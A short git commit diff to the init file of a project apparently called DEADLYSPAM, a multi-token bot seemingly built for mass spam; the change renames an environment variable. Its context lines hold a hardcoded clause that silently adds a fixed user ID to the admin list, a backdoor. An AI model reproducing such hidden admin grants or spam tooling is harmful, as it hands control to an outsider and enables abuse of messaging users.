ccc40b9f036764cdcf57b678f32c1592e4ee8788
BlazeOp <94062864+piroXpower@users.noreply.github.com>
2023-02-16 17:43:36 +0530

    Hmm

--- DEADLYSPAM/__init__.py
+++ DEADLYSPAM/__init__.py
@@ -36,7 +36,7 @@ BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
 BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
+SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
 if 5256676062 not in SUDO_USERS:
     SUDO_USERS.append(5937170640)
 
